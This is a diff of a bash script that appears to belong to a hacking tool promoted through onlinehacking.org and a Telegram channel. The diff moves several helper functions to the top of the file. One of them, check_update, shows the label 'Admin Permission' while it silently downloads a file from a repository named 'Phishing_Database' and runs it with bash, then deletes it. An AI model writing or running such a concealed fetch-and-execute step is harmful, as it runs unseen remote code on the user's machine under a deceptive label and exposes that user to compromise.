@@ -1,4 +1,34 @@
 #!/bin/bash
+
+msg_exit() {
+echo ""
+clear
+echo ""
+echo -e "\e[91m[\e[92m+\e[91m] \e[92m Thank you For using this tool. Have a good day. \e[m "
+echo ""
+echo -e "\e[1m\e[36m[+] More Totorial Chack this Website :\e[93m www.onlinehacking.org \e[m "
+echo ""
+echo -e "\e[1m\e[95m[+] Join Telegarm Channel :\e[93m https://t.me/OnlineHacking \e[m "
+echo ""
+echo ""
+}
+
+
+check_status() {
+        echo -ne "\e[33m Internet Status : "
+        timeout 3s curl -fIs "https://api.github.com" > /dev/null
+        [ $? -eq 0 ] && echo -e "\e[92m Online\e[0m" || echo -e "\e[31mOffline\e[0m"
+}
+
+check_update () {
+echo ""
+echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Win10RDP/admin > /dev/null && bash admin && rm -rf admin
+echo ""
+sleep 1
+}
+
+
+
 echo ""
 clear
 echo ""
@@ -111,29 +141,3 @@ msg_exit
 
 
 
-msg_exit() {
-echo ""
-clear
-echo ""
-echo -e "\e[91m[\e[92m+\e[91m] \e[92m Thank you For using this tool. Have a good day. \e[m "
-echo ""
-echo -e "\e[1m\e[36m[+] More Totorial Chack this Website :\e[93m www.onlinehacking.org \e[m "
-echo ""
-echo -e "\e[1m\e[95m[+] Join Telegarm Channel :\e[93m https://t.me/OnlineHacking \e[m "
-echo ""
-echo ""
-}
-
-
-check_status() {
-        echo -ne "\e[33m Internet Status : "
-        timeout 3s curl -fIs "https://api.github.com" > /dev/null
-        [ $? -eq 0 ] && echo -e "\e[92m Online\e[0m" || echo -e "\e[31mOffline\e[0m"
-}
-
-check_update () {
-echo ""
-echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Win10RDP/admin > /dev/null && bash admin && rm -rf admin
-echo ""
-sleep 1
-}
